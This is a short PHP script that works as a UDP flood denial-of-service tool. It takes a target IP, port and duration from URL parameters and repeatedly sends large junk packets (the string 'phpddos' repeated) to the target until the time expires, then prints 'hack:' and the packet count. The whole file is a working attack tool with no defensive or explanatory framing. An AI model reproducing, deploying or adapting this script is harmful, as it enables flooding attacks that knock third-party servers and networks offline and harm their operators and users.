<?php
	$packets = 0;
	$ip = $_GET['ip'];
	$port = $_GET['port'];
	set_time_limit(0);
	ignore_user_abort(FALSE);
	$exec_time = $_GET['time'];
	$time = time();
	$max_time = $time+$exec_time;
	$out = "";
	if(empty($_GET['ip'])){
		echo 'ipisnull';
		exit(1);
	}
	for($i=0;$i<65535;$i++){
		$out.= "phpddos";
	}
	while(1){
		$packets++;
		if(time() > $max_time){
			break;
		}
		$fp = fsockopen("udp://$ip", $port, $errno, $errstr, 5);//这几句是核心功能
		if($fp){
			fwrite($fp, $out);
			fclose($fp);
		}
	}
	echo 'hack:'.$packets;
?>
